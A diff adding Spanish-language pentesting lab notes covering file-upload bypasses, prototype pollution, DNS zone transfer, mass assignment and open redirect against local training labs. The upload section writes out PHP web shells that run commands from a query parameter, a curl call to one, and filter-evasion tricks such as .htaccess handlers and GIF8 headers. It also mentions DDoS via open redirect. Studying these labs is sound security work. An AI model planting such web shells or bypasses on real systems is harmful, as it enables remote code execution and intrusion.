@@ -920,3 +920,79 @@ en el endpoint para localizar vehiculo puedo ver la localizacion de otros autos 
 - en las response de "community" en cada mensaje mostrado se muestra informacion del usuario como el vehicleID, que luego sirve para usarlo en el localizador de vehiculo
 
 # 17. abuso de subidas de archivos
+https://hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=file%20upload#from-file-upload-to-other-vulnerabilities
+
+upload1. subir un archivo malicioso php directamente
+```php
+<?php
+	system($ _GET['cmd']);
+?>
+```
+con query cmd="comando" se puede ejecutar cualquier cosa
+
+upload3. se hace la validacion desde el cliente
+se le borra del html: onsubmit="return Validate(this);"
+entonces no valida mas del lado de servidor y se puede subir cualquier tipo de archivo
+
+upload10. se pueden subir archivos con php3, pero no lo esta interpretando
+con php5 si se puede interpretar
+
+upload11. se pueden subir archivos pht e interpretarlos
+
+upload12. con el archivo .htaccess
+se le pone al archivo:
+AddType application/x-httpd-php .test
+luego cargo otro archivo que este escrito en php pero sea .test se va a ejecutar el php
+
+upload16. ahora hay una restriccion por tamano del archivo
+se puede cambiar el tamano maximo de archivo desde el payload del cliente
+
+upload17. se puede enviar un body mucho mas chico
+```php
+	<?=`$_GET[0]`?>
+```
+upload 21. se le cambia el header Content-Type por (ejemplo) image/jpg
+upload 23. se puede poner GIF8 al inicio del codigo php y se le cambia el header Content-Type a image/gif
+upload 31. se puede subir el gif, pero le cambia en nombre, entoncers para ejecutarlo se busca el nombre que se le da en el source code
+upload 33. como los archivos son sha1sum (porque tiene 40 caracteres), si se convierte todo el contenido del archivo php a ese formato, entoncer se puede ejecutar correctametne
+upload 41. se ejecuta en la ruta /images/cmd.php&cmd=pwd
+upload 51. se sube archivo cmd.jpg.php y lo acepta por una regex mal hecha
+upload 56. lo guarda en testing y se puede llamar con:
+- curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php" -G --data-urlencode "cmd=pwd"
+upload 58. se sube un .htaccess despues se carga el archivo malicioso, se cambia el header por image/gif y se le pone al inicio del payload: GIF8.
+
+con exiftool -Comment="codigo malicioso" >archivo.gif
+se puede inyectar codigo php en los metadados del archivo gif
+
+# 18. prototype pollution
+[https://github.com/blabla1337/skf-labs](https://github.com/blabla1337/skf-labs)
+en la carpeta de prototype pollution
+
+en el index.js se esta haciendo merge de un request, donde se combinan parametros de un objeto
+
+cuando se asigna un valor con \_\_proto\__ se pueden inyectar propiedades cuando sean inexistentes en otro objeto "osea undefined", es como que hereda el atributo que se le inyecta con proto
+
+# 19. AXFR full zone transfer
+AXFR se transfiere toda la informacion de la zone
+IXFR se transfiere la informacion incremental, partiendo de la ultima transferencia que se hizo
+
+[https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer](https://github.com/vulhub/vulhub/tree/master/dns/dns-zone-transfer)
+
+dig ns @127.0.0.1 lukacorp.local => ver nameservers
+dig mx @127.0.0.1 lukacorp.local => ver servidores de correo
+dig axfr @127.0.0.1 lukacorp.local => muestra toda la informacion de la zona, los subdominios
+
+# 20. mass-asignment attack / parameter binding 
+cuando se hace el req POST de registro, nunca se indica el parametro "customer", pero si se puede ver en la response del servidor
+si se intenta agregar el campo "role":"admin" (que no aparece en la interfaz de la pagina) entonces se puede registrar un usuario como admin
+
+docker pull blabla1337/owasp-skf-lab:parameter-binding
+docker run -ti -p 3080:3080 blabla1337/owasp-skf-lab:parameter-binding
+
+# 21. open redirect
+se usa la herramienta: https://github.com/epsylon/ufonet
+se puede hacer DDoS usando el redirect de otro servidor
+
+en el "harder" se puede url encondear el body post del request porque no permite usar puntos para la url
+
+# 22. enumeracion y explotacion de webDAV
